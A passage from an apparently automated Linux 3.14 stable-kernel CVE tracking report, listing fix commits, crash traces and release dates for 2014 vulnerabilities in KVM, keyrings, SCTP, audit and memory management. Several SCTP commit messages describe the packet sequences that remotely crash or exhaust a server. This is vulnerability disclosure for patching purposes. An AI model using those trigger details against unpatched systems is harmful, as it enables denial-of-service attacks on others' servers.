    Modules linked in: xt_nat xt_mark nf_conntrack_netbios_ns nf_conntrack_broadcast ip6t_rpfilter ip6t_REJECT xt_conntrack ebtable_nat ebtable_broute bridge stp llc ebtable_filter ebtables ip6table_ni
    CPU: 0 PID: 26011 Comm: kworker/0:1 Not tainted 3.14.9-200.fc20.x86_64 #1
    Hardware name: Bochs Bochs, BIOS Bochs 01/01/2011
    Workqueue: events key_garbage_collector
    task: ffff8800918bd580 ti: ffff8800aac14000 task.ti: ffff8800aac14000
    RIP: 0010:[<ffffffff8136cea7>] [<ffffffff8136cea7>] assoc_array_gc+0x2f7/0x540
    RSP: 0018:ffff8800aac15d40  EFLAGS: 00010206
    RAX: 0000000000000000 RBX: 0000000000000000 RCX: ffff8800aaecacc0
    RDX: ffff8800daecf440 RSI: 0000000000000001 RDI: ffff8800aadc2bc0
    RBP: ffff8800aac15da8 R08: 0000000000000001 R09: 0000000000000003
    R10: ffffffff8136ccc7 R11: 0000000000000000 R12: 0000000000000000
    R13: 0000000000000000 R14: 0000000000000070 R15: 0000000000000001
    FS:  0000000000000000(0000) GS:ffff88011fc00000(0000) knlGS:0000000000000000
    CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b
    CR2: 0000000000000018 CR3: 00000000db10d000 CR4: 00000000000006f0
    Stack:
     ffff8800aac15d50 0000000000000011 ffff8800aac15db8 ffffffff812e2a70
     ffff880091a00600 0000000000000000 ffff8800aadc2bc3 00000000cd42c987
     ffff88003702df20 ffff88003702dfa0 0000000053b65c09 ffff8800aac15fd8
    Call Trace:
     [<ffffffff812e2a70>] ? keyring_detect_cycle_iterator+0x30/0x30
     [<ffffffff812e3e75>] keyring_gc+0x75/0x80
     [<ffffffff812e1424>] key_garbage_collector+0x154/0x3c0
     [<ffffffff810a67b6>] process_one_work+0x176/0x430
     [<ffffffff810a744b>] worker_thread+0x11b/0x3a0
     [<ffffffff810a7330>] ? rescuer_thread+0x3b0/0x3b0
     [<ffffffff810ae1a8>] kthread+0xd8/0xf0
     [<ffffffff810ae0d0>] ? insert_kthread_work+0x40/0x40
     [<ffffffff816ffb7c>] ret_from_fork+0x7c/0xb0
     [<ffffffff810ae0d0>] ? insert_kthread_work+0x40/0x40
    Code: 08 4c 8b 22 0f 84 bf 00 00 00 41 83 c7 01 49 83 e4 fc 41 83 ff 0f 4c 89 65 c0 0f 8f 5a fe ff ff 48 8b 45 c0 4d 63 cf 49 83 c1 02 <4e> 8b 34 c8 4d 85 f6 0f 84 be 00 00 00 41 f6 c6 01 0f 84 92
    RIP  [<ffffffff8136cea7>] assoc_array_gc+0x2f7/0x540
     RSP <ffff8800aac15d40>
    CR2: 0000000000000018
    ---[ end trace 1129028a088c0cbd ]---
    
    Signed-off-by: David Howells <dhowells@redhat.com>
    Acked-by: Don Zickus <dzickus@redhat.com>
    Signed-off-by: James Morris <james.l.morris@oracle.com>

 lib/assoc_array.c |    4 +++-
 1 file changed, 3 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-09-28
CVE: CVE-2014-3631
Break Date: 2013-09-24
Break Commit: b2a4df200d570b2c33a57e1ebfa5896e4bc81b69
Break Tag: 3.13
Linus Fix Date: 2014-09-12
Linus Commit: 95389b08d93d5c06ec63ab49bd732b0069b7c35e
Linus Tag: 3.17
Stable Date: 2014-09-17
Stable Commit: 1143261f66aec99fdfbc98903b55d51bb55572a1
Stable Tag: 3.14.19

CVE-2014-3646:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.24.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit a642fc305053cc1c6e47e4f4df327895747ab485
Author: Petr Matousek <pmatouse@redhat.com>
Date:   Tue Sep 23 20:22:30 2014 +0200

    kvm: vmx: handle invvpid vm exit gracefully
    
    On systems with invvpid instruction support (corresponding bit in
    IA32_VMX_EPT_VPID_CAP MSR is set) guest invocation of invvpid
    causes vm exit, which is currently not handled and results in
    propagation of unknown exit to userspace.
    
    Fix this by installing an invvpid vm exit handler.
    
    This is CVE-2014-3646.
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Petr Matousek <pmatouse@redhat.com>
    Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

 arch/x86/include/uapi/asm/vmx.h |    2 ++
 arch/x86/kvm/vmx.c              |    9 ++++++++-
 2 files changed, 10 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-10
CVE: CVE-2014-3646
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-10-24
Linus Commit: a642fc305053cc1c6e47e4f4df327895747ab485
Linus Tag: 3.18
Stable Date: 2014-11-14
Stable Commit: 8b74c6f87d4baf5e48e44af2f90cda91ed7b848e
Stable Tag: 3.14.24

CVE-2014-3647:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.24.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 234f3ce485d54017f15cf5e0699cff4100121601
Author: Nadav Amit <namit@cs.technion.ac.il>
Date:   Thu Sep 18 22:39:38 2014 +0300

    KVM: x86: Emulator fixes for eip canonical checks on near branches
    
    Before changing rip (during jmp, call, ret, etc.) the target should be asserted
    to be canonical one, as real CPUs do.  During sysret, both target rsp and rip
    should be canonical. If any of these values is noncanonical, a #GP exception
    should occur.  The exception to this rule are syscall and sysenter instructions
    in which the assigned rip is checked during the assignment to the relevant
    MSRs.
    
    This patch fixes the emulator to behave as real CPUs do for near branches.
    Far branches are handled by the next patch.
    
    This fixes CVE-2014-3647.
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Nadav Amit <namit@cs.technion.ac.il>
    Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

 arch/x86/kvm/emulate.c |   78 +++++++++++++++++++++++++++++++++---------------
 1 file changed, 54 insertions(+), 24 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-10
CVE: CVE-2014-3647
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-10-24
Linus Commit: 234f3ce485d54017f15cf5e0699cff4100121601
Linus Tag: 3.18
Stable Date: 2014-11-14
Stable Commit: 6dae4910cabb03b3a677facd8d1768fc47eef6ae
Stable Tag: 3.14.24

CVE-2014-3647:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit d1442d85cc30ea75f7d399474ca738e0bc96f715
Author: Nadav Amit <namit@cs.technion.ac.il>
Date:   Thu Sep 18 22:39:39 2014 +0300

    KVM: x86: Handle errors when RIP is set during far jumps
    
    Far jmp/call/ret may fault while loading a new RIP.  Currently KVM does not
    handle this case, and may result in failed vm-entry once the assignment is
    done.  The tricky part of doing so is that loading the new CS affects the
    VMCS/VMCB state, so if we fail during loading the new RIP, we are left in
    unconsistent state.  Therefore, this patch saves on 64-bit the old CS
    descriptor and restores it if loading RIP failed.
    
    This fixes CVE-2014-3647.
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Nadav Amit <namit@cs.technion.ac.il>
    Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

 arch/x86/kvm/emulate.c |  118 ++++++++++++++++++++++++++++++++++++------------
 1 file changed, 88 insertions(+), 30 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-10
CVE: CVE-2014-3647
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-10-24
Linus Commit: d1442d85cc30ea75f7d399474ca738e0bc96f715
Linus Tag: 3.18
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2014-3673:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.25.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 9de7922bc709eee2f609cd01d98aaedc4cf5ea74
Author: Daniel Borkmann <dborkman@redhat.com>
Date:   Thu Oct 9 22:55:31 2014 +0200

    net: sctp: fix skb_over_panic when receiving malformed ASCONF chunks
    
    Commit 6f4c618ddb0 ("SCTP : Add paramters validity check for
    ASCONF chunk") added basic verification of ASCONF chunks, however,
    it is still possible to remotely crash a server by sending a
    special crafted ASCONF chunk, even up to pre 2.6.12 kernels:
    
    skb_over_panic: text:ffffffffa01ea1c3 len:31056 put:30768
     head:ffff88011bd81800 data:ffff88011bd81800 tail:0x7950
     end:0x440 dev:<NULL>
     ------------[ cut here ]------------
    kernel BUG at net/core/skbuff.c:129!
    [...]
    Call Trace:
     <IRQ>
     [<ffffffff8144fb1c>] skb_put+0x5c/0x70
     [<ffffffffa01ea1c3>] sctp_addto_chunk+0x63/0xd0 [sctp]
     [<ffffffffa01eadaf>] sctp_process_asconf+0x1af/0x540 [sctp]
     [<ffffffff8152d025>] ? _read_unlock_bh+0x15/0x20
     [<ffffffffa01e0038>] sctp_sf_do_asconf+0x168/0x240 [sctp]
     [<ffffffffa01e3751>] sctp_do_sm+0x71/0x1210 [sctp]
     [<ffffffff8147645d>] ? fib_rules_lookup+0xad/0xf0
     [<ffffffffa01e6b22>] ? sctp_cmp_addr_exact+0x32/0x40 [sctp]
     [<ffffffffa01e8393>] sctp_assoc_bh_rcv+0xd3/0x180 [sctp]
     [<ffffffffa01ee986>] sctp_inq_push+0x56/0x80 [sctp]
     [<ffffffffa01fcc42>] sctp_rcv+0x982/0xa10 [sctp]
     [<ffffffffa01d5123>] ? ipt_local_in_hook+0x23/0x28 [iptable_filter]
     [<ffffffff8148bdc9>] ? nf_iterate+0x69/0xb0
     [<ffffffff81496d10>] ? ip_local_deliver_finish+0x0/0x2d0
     [<ffffffff8148bf86>] ? nf_hook_slow+0x76/0x120
     [<ffffffff81496d10>] ? ip_local_deliver_finish+0x0/0x2d0
     [<ffffffff81496ded>] ip_local_deliver_finish+0xdd/0x2d0
     [<ffffffff81497078>] ip_local_deliver+0x98/0xa0
     [<ffffffff8149653d>] ip_rcv_finish+0x12d/0x440
     [<ffffffff81496ac5>] ip_rcv+0x275/0x350
     [<ffffffff8145c88b>] __netif_receive_skb+0x4ab/0x750
     [<ffffffff81460588>] netif_receive_skb+0x58/0x60
    
    This can be triggered e.g., through a simple scripted nmap
    connection scan injecting the chunk after the handshake, for
    example, ...
    
      -------------- INIT[ASCONF; ASCONF_ACK] ------------->
      <----------- INIT-ACK[ASCONF; ASCONF_ACK] ------------
      -------------------- COOKIE-ECHO -------------------->
      <-------------------- COOKIE-ACK ---------------------
      ------------------ ASCONF; UNKNOWN ------------------>
    
    ... where ASCONF chunk of length 280 contains 2 parameters ...
    
      1) Add IP address parameter (param length: 16)
      2) Add/del IP address parameter (param length: 255)
    
    ... followed by an UNKNOWN chunk of e.g. 4 bytes. Here, the
    Address Parameter in the ASCONF chunk is even missing, too.
    This is just an example and similarly-crafted ASCONF chunks
    could be used just as well.
    
    The ASCONF chunk passes through sctp_verify_asconf() as all
    parameters passed sanity checks, and after walking, we ended
    up successfully at the chunk end boundary, and thus may invoke
    sctp_process_asconf(). Parameter walking is done with
    WORD_ROUND() to take padding into account.
    
    In sctp_process_asconf()'s TLV processing, we may fail in
    sctp_process_asconf_param() e.g., due to removal of the IP
    address that is also the source address of the packet containing
    the ASCONF chunk, and thus we need to add all TLVs after the
    failure to our ASCONF response to remote via helper function
    sctp_add_asconf_response(), which basically invokes a
    sctp_addto_chunk() adding the error parameters to the given
    skb.
    
    When walking to the next parameter this time, we proceed
    with ...
    
      length = ntohs(asconf_param->param_hdr.length);
      asconf_param = (void *)asconf_param + length;
    
    ... instead of the WORD_ROUND()'ed length, thus resulting here
    in an off-by-one that leads to reading the follow-up garbage
    parameter length of 12336, and thus throwing an skb_over_panic
    for the reply when trying to sctp_addto_chunk() next time,
    which implicitly calls the skb_put() with that length.
    
    Fix it by using sctp_walk_params() [ which is also used in
    INIT parameter processing ] macro in the verification *and*
    in ASCONF processing: it will make sure we don't spill over,
    that we walk parameters WORD_ROUND()'ed. Moreover, we're being
    more defensive and guard against unknown parameter types and
    missized addresses.
    
    Joint work with Vlad Yasevich.
    
    Fixes: b896b82be4ae ("[SCTP] ADDIP: Support for processing incoming ASCONF_ACK chunks.")
    Signed-off-by: Daniel Borkmann <dborkman@redhat.com>
    Signed-off-by: Vlad Yasevich <vyasevich@gmail.com>
    Acked-by: Neil Horman <nhorman@tuxdriver.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/sctp/sm.h    |    6 +--
 net/sctp/sm_make_chunk.c |   99 +++++++++++++++++++++++++---------------------
 net/sctp/sm_statefuns.c  |   18 +--------
 3 files changed, 60 insertions(+), 63 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-10
CVE: CVE-2014-3673
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-10-14
Linus Commit: 9de7922bc709eee2f609cd01d98aaedc4cf5ea74
Linus Tag: 3.18
Stable Date: 2014-11-21
Stable Commit: e36b6ac9e011205eb7ad3af329dbd27a21bacd50
Stable Tag: 3.14.25

CVE-2014-3687:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.25.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit b69040d8e39f20d5215a03502a8e8b4c6ab78395
Author: Daniel Borkmann <dborkman@redhat.com>
Date:   Thu Oct 9 22:55:32 2014 +0200

    net: sctp: fix panic on duplicate ASCONF chunks
    
    When receiving a e.g. semi-good formed connection scan in the
    form of ...
    
      -------------- INIT[ASCONF; ASCONF_ACK] ------------->
      <----------- INIT-ACK[ASCONF; ASCONF_ACK] ------------
      -------------------- COOKIE-ECHO -------------------->
      <-------------------- COOKIE-ACK ---------------------
      ---------------- ASCONF_a; ASCONF_b ----------------->
    
    ... where ASCONF_a equals ASCONF_b chunk (at least both serials
    need to be equal), we panic an SCTP server!
    
    The problem is that good-formed ASCONF chunks that we reply with
    ASCONF_ACK chunks are cached per serial. Thus, when we receive a
    same ASCONF chunk twice (e.g. through a lost ASCONF_ACK), we do
    not need to process them again on the server side (that was the
    idea, also proposed in the RFC). Instead, we know it was cached
    and we just resend the cached chunk instead. So far, so good.
    
    Where things get nasty is in SCTP's side effect interpreter, that
    is, sctp_cmd_interpreter():
    
    While incoming ASCONF_a (chunk = event_arg) is being marked
    !end_of_packet and !singleton, and we have an association context,
    we do not flush the outqueue the first time after processing the
    ASCONF_ACK singleton chunk via SCTP_CMD_REPLY. Instead, we keep it
    queued up, although we set local_cork to 1. Commit 2e3216cd54b1
    changed the precedence, so that as long as we get bundled, incoming
    chunks we try possible bundling on outgoing queue as well. Before
    this commit, we would just flush the output queue.
    
    Now, while ASCONF_a's ASCONF_ACK sits in the corked outq, we
    continue to process the same ASCONF_b chunk from the packet. As
    we have cached the previous ASCONF_ACK, we find it, grab it and
    do another SCTP_CMD_REPLY command on it. So, effectively, we rip
    the chunk->list pointers and requeue the same ASCONF_ACK chunk
    another time. Since we process ASCONF_b, it's correctly marked
    with end_of_packet and we enforce an uncork, and thus flush, thus
    crashing the kernel.
    
    Fix it by testing if the ASCONF_ACK is currently pending and if
    that is the case, do not requeue it. When flushing the output
    queue we may relink the chunk for preparing an outgoing packet,
    but eventually unlink it when it's copied into the skb right
    before transmission.
    
    Joint work with Vlad Yasevich.
    
    Fixes: 2e3216cd54b1 ("sctp: Follow security requirement of responding with 1 packet")
    Signed-off-by: Daniel Borkmann <dborkman@redhat.com>
    Signed-off-by: Vlad Yasevich <vyasevich@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/sctp/sctp.h |    5 +++++
 net/sctp/associola.c    |    2 ++
 2 files changed, 7 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-10
CVE: CVE-2014-3687
Break Date: 2008-06-19
Break Commit: 2e3216cd54b142ba605e87522e15f42e0c4e3996
Break Tag: 2.6
Linus Fix Date: 2014-10-14
Linus Commit: b69040d8e39f20d5215a03502a8e8b4c6ab78395
Linus Tag: 3.18
Stable Date: 2014-11-21
Stable Commit: 59ea8663e3a7fc3a0c2841e310b83f7aaec1c017
Stable Tag: 3.14.25

CVE-2014-3688:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.25.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 26b87c7881006311828bb0ab271a551a62dcceb4
Author: Daniel Borkmann <dborkman@redhat.com>
Date:   Thu Oct 9 22:55:33 2014 +0200

    net: sctp: fix remote memory pressure from excessive queueing
    
    This scenario is not limited to ASCONF, just taken as one
    example triggering the issue. When receiving ASCONF probes
    in the form of ...
    
      -------------- INIT[ASCONF; ASCONF_ACK] ------------->
      <----------- INIT-ACK[ASCONF; ASCONF_ACK] ------------
      -------------------- COOKIE-ECHO -------------------->
      <-------------------- COOKIE-ACK ---------------------
      ---- ASCONF_a; [ASCONF_b; ...; ASCONF_n;] JUNK ------>
      [...]
      ---- ASCONF_m; [ASCONF_o; ...; ASCONF_z;] JUNK ------>
    
    ... where ASCONF_a, ASCONF_b, ..., ASCONF_z are good-formed
    ASCONFs and have increasing serial numbers, we process such
    ASCONF chunk(s) marked with !end_of_packet and !singleton,
    since we have not yet reached the SCTP packet end. SCTP does
    only do verification on a chunk by chunk basis, as an SCTP
    packet is nothing more than just a container of a stream of
    chunks which it eats up one by one.
    
    We could run into the case that we receive a packet with a
    malformed tail, above marked as trailing JUNK. All previous
    chunks are here goodformed, so the stack will eat up all
    previous chunks up to this point. In case JUNK does not fit
    into a chunk header and there are no more other chunks in
    the input queue, or in case JUNK contains a garbage chunk
    header, but the encoded chunk length would exceed the skb
    tail, or we came here from an entirely different scenario
    and the chunk has pdiscard=1 mark (without having had a flush
    point), it will happen, that we will excessively queue up
    the association's output queue (a correct final chunk may
    then turn it into a response flood when flushing the
    queue ;)): I ran a simple script with incremental ASCONF
    serial numbers and could see the server side consuming
    excessive amount of RAM [before/after: up to 2GB and more].
    
    The issue at heart is that the chunk train basically ends
    with !end_of_packet and !singleton markers and since commit
    2e3216cd54b1 ("sctp: Follow security requirement of responding
    with 1 packet") therefore preventing an output queue flush
    point in sctp_do_sm() -> sctp_cmd_interpreter() on the input
    chunk (chunk = event_arg) even though local_cork is set,
    but its precedence has changed since then. In the normal
    case, the last chunk with end_of_packet=1 would trigger the
    queue flush to accommodate possible outgoing bundling.
    
    In the input queue, sctp_inq_pop() seems to do the right thing
    in terms of discarding invalid chunks. So, above JUNK will
    not enter the state machine and instead be released and exit
    the sctp_assoc_bh_rcv() chunk processing loop. It's simply
    the flush point being missing at loop exit. Adding a try-flush
    approach on the output queue might not work as the underlying
    infrastructure might be long gone at this point due to the
    side-effect interpreter run.
    
    One possibility, albeit a bit of a kludge, would be to defer
    invalid chunk freeing into the state machine in order to
    possibly trigger packet discards and thus indirectly a queue
    flush on error. It would surely be better to discard chunks
    as in the current, perhaps better controlled environment, but
    going back and forth, it's simply architecturally not possible.
    I tried various trailing JUNK attack cases and it seems to
    look good now.
    
    Joint work with Vlad Yasevich.
    
    Fixes: 2e3216cd54b1 ("sctp: Follow security requirement of responding with 1 packet")
    Signed-off-by: Daniel Borkmann <dborkman@redhat.com>
    Signed-off-by: Vlad Yasevich <vyasevich@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/sctp/inqueue.c      |   33 +++++++--------------------------
 net/sctp/sm_statefuns.c |    3 +++
 2 files changed, 10 insertions(+), 26 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-29
CVE: CVE-2014-3688
Break Date: 2008-06-19
Break Commit: 2e3216cd54b142ba605e87522e15f42e0c4e3996
Break Tag: 2.6
Linus Fix Date: 2014-10-14
Linus Commit: 26b87c7881006311828bb0ab271a551a62dcceb4
Linus Tag: 3.18
Stable Date: 2014-11-21
Stable Commit: 75680aa393f12465fc10642d2d55be49a333d828
Stable Tag: 3.14.25

CVE-2014-3690:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.33.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit d974baa398f34393db76be45f7d4d04fbdbb4a0a
Author: Andy Lutomirski <luto@amacapital.net>
Date:   Wed Oct 8 09:02:13 2014 -0700

    x86,kvm,vmx: Preserve CR4 across VM entry
    
    CR4 isn't constant; at least the TSD and PCE bits can vary.
    
    TBH, treating CR0 and CR3 as constant scares me a bit, too, but it looks
    like it's correct.
    
    This adds a branch and a read from cr4 to each vm entry.  Because it is
    extremely likely that consecutive entries into the same vcpu will have
    the same host cr4 value, this fixes up the vmcs instead of restoring cr4
    after the fact.  A subsequent patch will add a kernel-wide cr4 shadow,
    reducing the overhead in the common case to just two memory reads and a
    branch.
    
    Signed-off-by: Andy Lutomirski <luto@amacapital.net>
    Acked-by: Paolo Bonzini <pbonzini@redhat.com>
    Cc: stable@vger.kernel.org
    Cc: Petr Matousek <pmatouse@redhat.com>
    Cc: Gleb Natapov <gleb@kernel.org>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 arch/x86/kvm/vmx.c |   16 ++++++++++++++--
 1 file changed, 14 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-11-10
CVE: CVE-2014-3690
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-10-18
Linus Commit: d974baa398f34393db76be45f7d4d04fbdbb4a0a
Linus Tag: 3.18
Stable Date: 2015-02-11
Stable Commit: 5fb88e88031daf17e29ba5c679fe5ec4b8047e1a
Stable Tag: 3.14.33

CVE-2014-3917:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.8.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit a3c54931199565930d6d84f4c3456f6440aefd41
Author: Andy Lutomirski <luto@amacapital.net>
Date:   Wed May 28 23:09:58 2014 -0400

    auditsc: audit_krule mask accesses need bounds checking
    
    Fixes an easy DoS and possible information disclosure.
    
    This does nothing about the broken state of x32 auditing.
    
    eparis: If the admin has enabled auditd and has specifically loaded
    audit rules.  This bug has been around since before git.  Wow...
    
    Cc: stable@vger.kernel.org
    Signed-off-by: Andy Lutomirski <luto@amacapital.net>
    Signed-off-by: Eric Paris <eparis@redhat.com>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 kernel/auditsc.c |   27 ++++++++++++++++++---------
 1 file changed, 18 insertions(+), 9 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-06-05
CVE: CVE-2014-3917
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-06-10
Linus Commit: a3c54931199565930d6d84f4c3456f6440aefd41
Linus Tag: 3.16
Stable Date: 2014-06-16
Stable Commit: 732eafc78bba8e18a51c169f3dc7f33cddcdc401
Stable Tag: 3.14.8

CVE-2014-3940:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.7.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit d4c54919ed86302094c0ca7d48a8cbd4ee753e92
Author: Naoya Horiguchi <n-horiguchi@ah.jp.nec.com>
Date:   Fri Jun 6 10:00:01 2014 -0400

    mm: add !pte_present() check on existing hugetlb_entry callbacks
    
    The age table walker doesn't check non-present hugetlb entry in common
    path, so hugetlb_entry() callbacks must check it.  The reason for this
    behavior is that some callers want to handle it in its own way.
    
    [ I think that reason is bogus, btw - it should just do what the regular
      code does, which is to call the "pte_hole()" function for such hugetlb
      entries  - Linus]
    
    However, some callers don't check it now, which causes unpredictable
    result, for example when we have a race between migrating hugepage and
    reading /proc/pid/numa_maps.  This patch fixes it by adding !pte_present
    checks on buggy callbacks.
    
    This bug exists for years and got visible by introducing hugepage
    migration.
    
    ChangeLog v2:
    - fix if condition (check !pte_present() instead of pte_present())
    
    Reported-by: Sasha Levin <sasha.levin@oracle.com>
    Signed-off-by: Naoya Horiguchi <n-horiguchi@ah.jp.nec.com>
    Cc: Rik van Riel <riel@redhat.com>
    Cc: <stable@vger.kernel.org> [3.12+]
    Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
    [ Backported to 3.15.  Signed-off-by: Josh Boyer <jwboyer@fedoraproject.org> ]
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/proc/task_mmu.c |    2 +-
 mm/mempolicy.c     |    6 +++++-
 2 files changed, 6 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-06-05
CVE: CVE-2014-3940
Break Date: 2013-09-11
Break Commit: e2d8cf405525d83e6ca42969be460f94b0339798
Break Tag: 3.12
Linus Fix Date: 2014-06-06
Linus Commit: d4c54919ed86302094c0ca7d48a8cbd4ee753e92
Linus Tag: 3.15
Stable Date: 2014-06-11
Stable Commit: 395982ce12b3aba14a197ead3e5828e77e11aec1
Stable Tag: 3.14.7

CVE-2014-4014:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.8.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 23adbe12ef7d3d4195e80800ab36b37bee28cd03
Author: Andy Lutomirski <luto@amacapital.net>
Date:   Tue Jun 10 12:45:42 2014 -0700

    fs,userns: Change inode_capable to capable_wrt_inode_uidgid
    
    The kernel has no concept of capabilities with respect to inodes; inodes
    exist independently of namespaces.  For example, inode_capable(inode,
    CAP_LINUX_IMMUTABLE) would be nonsense.
    
    This patch changes inode_capable to check for uid and gid mappings and
    renames it to capable_wrt_inode_uidgid, which should make it more
    obvious what it does.
    
    Fixes CVE-2014-4014.
    
    Cc: Theodore Ts'o <tytso@mit.edu>
    Cc: Serge Hallyn <serge.hallyn@ubuntu.com>
    Cc: "Eric W. Biederman" <ebiederm@xmission.com>
    Cc: Dave Chinner <david@fromorbit.com>
    Cc: stable@vger.kernel.org
    Signed-off-by: Andy Lutomirski <luto@amacapital.net>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/attr.c                  |    8 ++++----
 fs/inode.c                 |   10 +++++++---
 fs/namei.c                 |   11 ++++++-----
 fs/xfs/xfs_ioctl.c         |    2 +-
 include/linux/capability.h |    2 +-
 kernel/capability.c        |   20 ++++++++------------
 6 files changed, 27 insertions(+), 26 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-06-23
CVE: CVE-2014-4014
Break Date: 2012-04-07
Break Commit: 1a48e2ac034d47ed843081c4523b63c46b46888b
Break Tag: 3.5
Linus Fix Date: 2014-06-10
Linus Commit: 23adbe12ef7d3d4195e80800ab36b37bee28cd03
Linus Tag: 3.16
Stable Date: 2014-06-16
Stable Commit: 5bacea89dc8dfd3f7d7dfbed798f3b41d4f53c78
Stable Tag: 3.14.8

CVE-2014-4157:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.8.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 137f7df8cead00688524c82360930845396b8a21
Author: Markos Chandras <markos.chandras@imgtec.com>
Date:   Wed Jan 22 14:40:00 2014 +0000

    MIPS: asm: thread_info: Add _TIF_SECCOMP flag
    
    Add _TIF_SECCOMP flag to _TIF_WORK_SYSCALL_ENTRY to indicate
    that the system call needs to be checked against a seccomp filter.
    
    Signed-off-by: Markos Chandras <markos.chandras@imgtec.com>
    Reviewed-by: Paul Burton <paul.burton@imgtec.com>
    Reviewed-by: James Hogan <james.hogan@imgtec.com>
    Cc: linux-mips@linux-mips.org
    Patchwork: https://patchwork.linux-mips.org/patch/6405/
    Signed-off-by: Ralf Baechle <ralf@linux-mips.org>

 arch/mips/include/asm/thread_info.h |    3 ++-
 1 file changed, 2 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2014-06-23
CVE: CVE-2014-4157
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2014-03-26
Linus Commit: 137f7df8cead00688524c82360930845396b8a21
Linus Tag: 3.15
Stable Date: 2014-06-16
Stable Commit: 2cbbc2f411bebb054f258c648272f38e2a23e052
Stable Tag: 3.14.8

CVE-2014-4171:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.14.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit f00cdc6df7d7cfcabb5b740911e6788cb0802bdb
Author: Hugh Dickins <hughd@google.com>
Date:   Mon Jun 23 13:22:06 2014 -0700

    shmem: fix faulting into a hole while it's punched
    
